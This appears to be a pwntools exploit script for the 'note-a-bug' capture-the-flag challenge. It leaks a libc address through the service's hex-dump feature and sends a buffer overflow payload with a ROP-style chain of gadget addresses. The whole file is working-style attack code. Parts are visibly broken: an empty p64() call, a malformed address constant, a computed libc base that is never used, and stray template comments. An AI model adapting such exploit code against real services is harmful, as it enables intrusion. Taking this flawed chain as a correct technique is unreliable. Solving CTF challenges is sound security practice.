#!/usr/bin/env python3
# Filename: replay-note_a_bug-4000-1770884573745904.py
import json
import os

from pwn import *

# Set logging level


# Load environment variables
# EXTRA is an array of the flagids for current service and team
HOST = "challenges.france-cybersecurity-challenge.fr"

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
io = remote(HOST, 2108)

io.recvuntil(b'[*] Current session: ')
session = io.recv(38).split(b'/')[2]
print(session)
data = io.recvuntil(b'ote\n0. Exit\n>>> ')
io.sendline(b'1')

io.recvuntil(b'[*] Creating note: ')
note = io.recv(31)
print(note)
data = io.recvuntil(b'ontent length: \n')
io.sendline(b'256')
data = io.recvuntil(b'Content: \n')
io.sendline(b'AAAAAAAA')
data = io.recvuntil(b'ote\n0. Exit\n>>> ')
io.sendline(b'2')
data = io.recvuntil(b't filename:\n>>> ')
io.sendline(session+b'/'+note)

io.recvuntil(b'[0x000000b0] ')

leak = io.recv(6*3).split(b' ')
gg = b''
for i in leak[::-1]:
    gg+=i
libc = ELF('./libc6_2.36-9+deb12u1_amd64.so')
elf = ELF('./note-a-bug')
rev=int(gg, 16) - libc.sym._IO_2_1_stdout_
print(hex(rev))


io.sendline(b'1')
io.recvuntil(b'[*] Creating note: ')
note = io.recv(31)
io.sendline(b'256')

print(note)
read_string = 0x00000000004013B4
hex_dump = 0x0000000004014FF

csu1 = 0x000000000401A02
csu2 = 0x00000000004019E8 

pl = b'A'*96
pl += p64(0)
pl += p64(0x40135e)
pl += p64()
pl += p64(0x000000000040135c)
pl += p64(0x100)
pl += p64(0)
pl += p64(hex_dump)


io.sendline(pl)


io.interactive()